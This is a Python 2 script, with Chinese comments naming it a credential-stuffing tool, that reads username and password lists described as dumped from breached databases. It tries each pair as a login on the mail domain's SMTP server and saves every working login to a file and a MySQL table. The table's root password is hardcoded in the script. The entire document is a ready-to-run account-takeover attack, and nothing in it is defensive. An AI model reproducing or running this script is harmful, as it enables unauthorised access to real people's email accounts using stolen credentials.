
#conding=utf8
import smtplib
import os
import MySQLdb

#python撞库字典获取方法
def getdic(file):
	dic = open(file).read()
	diclist = dic.split("\n")
	return diclist

lenmax =0
#得到脱裤后的用户密码字典
userlist  = getdic('map/smtpuser.txt')
passlist  = getdic('map/smtppass.txt')
if len(userlist)>len(passlist):
	lenmax=len(userlist)
else:
	lenmax=len(passlist)

while lenmax !=0:
	ctr = 0
	num = lenmax-1
	usr = userlist[num]
	pas = passlist[num]
	try:
		if len(pas)>16 or usr=='' or pas=='' :
			ctr = 1
			continue
		#ser为根据‘@’对邮箱地址进行切片获得域名
		ser = usr.split('@')[1]
		print num+1,":",usr,pas,
		#在和'smtp.'组合后获取服务器地址
		server=smtplib.SMTP("smtp."+ser)
		#尝试登录
		server.login(usr,pas)
		print "\t\t success",
		open('res/smtp.txt','a').write(usr+"\r"+pas+"\n")
		db = MySQLdb.connect("127.0.0.1","root","4030aoii103","apathy")
		cursor=db.cursor()
		cursor.execute("SELECT max(id) FROM `mail`")
		maxid = cursor.fetchall()[0][0]+1

		#python撞库 存入数据库
		sql = "INSERT INTO `mail` VALUES (%s,%s,%s,%s)"
		try:
			cursor.execute(sql,(maxid,usr,pas,ser))
			db.commit()
			print "get",
		except Exception, e:
			db.rollback()
			print e
		finally:
			db.close()

	except Exception, e:
		pass
	finally:
		lenmax-=1
		if ctr==0:
			print ' '
		